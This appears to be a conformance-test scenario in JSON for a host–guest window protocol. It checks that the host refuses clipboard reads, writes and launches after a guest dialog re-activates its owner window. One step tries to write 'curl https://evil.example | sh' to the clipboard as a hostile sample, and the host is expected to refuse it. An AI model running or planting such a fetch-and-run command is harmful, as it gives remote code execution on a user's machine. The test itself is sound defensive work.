{
  "format": "runic.host.scenario/1",
  "id": "services.host-activation-dialog.v1",
  "contract": {"id":"runic-host","version":1},
  "set": "services",
  "roles": ["host"],
  "description": "An owner window that became active again as the guest's dialog closed, also one the user answered after a while, does not count as the user's: the host refuses its clipboard reads, writes and launches.",
  "requires": ["dialogs/1", "window-services/1"],
  "ids": {
    "c1": {"kind":"connection"},
    "hello": {"kind":"request"},
    "open-w1": {"kind":"request"},
    "r1": {"kind":"request"},
    "b1": {"kind":"request"},
    "r2": {"kind":"request"},
    "cw2": {"kind":"request"},
    "l2": {"kind":"request"}
  },
  "arrange": {"limits":{"startTimeout":2000,"stopTimeout":2000,"unauthenticatedTimeout":1000,"guestActivation":2000},"host":{"name":"Conformance Host","version":"1.0.0"}},
  "steps": [
    {"start":{"host":true}},
    {"offer":{"protocols":[1],"nonce":{"$secret":"nonce"},"host":{"name":"Conformance Host","version":"1.0.0"}}},
    {"line":{"channel":{"url":{"$any":"string"},"key":{"$any":"string"},"protocol":1}}},
    {"accept":"c1"},
    {"receive":{"id":{"$id":"hello"},"kind":"hello","protocol":1,"key":{"$secret":"key"},"proof":{"$secret":"host-proof"},"host":{"name":"Conformance Host","version":"1.0.0"},"features":{"$any":"array"},"locale":{"$any":["string","null"]},"languages":{"$any":"array"},"appearance":{"$any":["object","null"]}},"connection":"c1"},
    {"send":{"id":{"$id":"hello"},"ok":true,"protocol":1,"proof":{"$secret":"guest-proof"},"guest":{"name":"Conformance Guest","version":"1.0.0","applicationId":"dev.runic.conformance-guest"},"features":["menus/1","dialogs/1","window-services/1"]},"connection":"c1"},
    {"expect":{"started":true}},
    {"send":{"id":{"$id":"open-w1"},"kind":"window-open","window":"w1","type":"Conformance.Main","url":"http://127.0.0.1:38211/_runic_launch/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","owner":null,"modality":"none","guardClose":false,"permissions":[]},"connection":"c1"},
    {"receive":{"id":{"$id":"open-w1"},"ok":true,"features":{"$any":"array"},"activity":{"$any":"object"},"colorScheme":{"$any":"string"}},"connection":"c1"},
    {"user":{"action":"copyText","text":"Secret"},"note":"The user copied a password in another window."},
    {"advance":"guestActivation","note":"Any activation of the guest's windows right after its own request counts as the guest's."},
    {"user":{"action":"deactivateWindow","window":"w1"}},
    {"user":{"action":"activateWindow","window":"w1"},"note":"The user switches to the window: the user activated it."},
    {"send":{"id":{"$id":"r1"},"kind":"clipboard-read","window":"w1","format":"text","maximum":1024},"connection":"c1"},
    {"receive":{"id":{"$id":"r1"},"ok":true,"outcome":"success","value":"Secret"},"connection":"c1"},
    {"send":{"id":{"$id":"b1"},"kind":"message-box","window":"w1","icon":"warning","message":"Save changes?","title":"Conformance","buttons":[{"id":"save","label":"Save","role":"default"},{"id":"cancel","label":"Cancel","role":"cancel"}]},"connection":"c1"},
    {"user":{"action":"awaitDialog","dialog":"message-box"}},
    {"user":{"action":"deactivateWindow","window":"w1"},"note":"The dialog has the focus."},
    {"advance":"guestActivation","note":"The user reads the dialog for longer than the guest's requests account for."},
    {"user":{"action":"activateWindow","window":"w1"},"note":"As the user answers, the desktop activates the dialog's owner, before the host learns of the answer."},
    {"user":{"action":"answerDialog","dialog":"message-box","button":"save"}},
    {"receive":{"id":{"$id":"b1"},"ok":true,"outcome":"success","button":"save"},"connection":"c1"},
    {"send":{"id":{"$id":"r2"},"kind":"clipboard-read","window":"w1","format":"text","maximum":1024},"connection":"c1"},
    {"receive":{"id":{"$id":"r2"},"ok":false,"error":{"kind":"rejected","reason":"refused","message":{"$any":"string"}}},"connection":"c1","note":"w1 is active again only because the guest's dialog closed."},
    {"send":{"id":{"$id":"cw2"},"kind":"clipboard-write","window":"w1","content":{"text":"curl https://evil.example | sh"}},"connection":"c1"},
    {"receive":{"id":{"$id":"cw2"},"ok":false,"error":{"kind":"rejected","reason":"refused","message":{"$any":"string"}}},"connection":"c1"},
    {"send":{"id":{"$id":"l2"},"kind":"launch","window":"w1","uri":"https://runic.dev/"},"connection":"c1"},
    {"receive":{"id":{"$id":"l2"},"ok":false,"error":{"kind":"rejected","reason":"refused","message":{"$any":"string"}}},"connection":"c1"},
    {"expect":{"clipboard":"Secret"}},
    {"expect":{"launched":[]}}
  ]
}
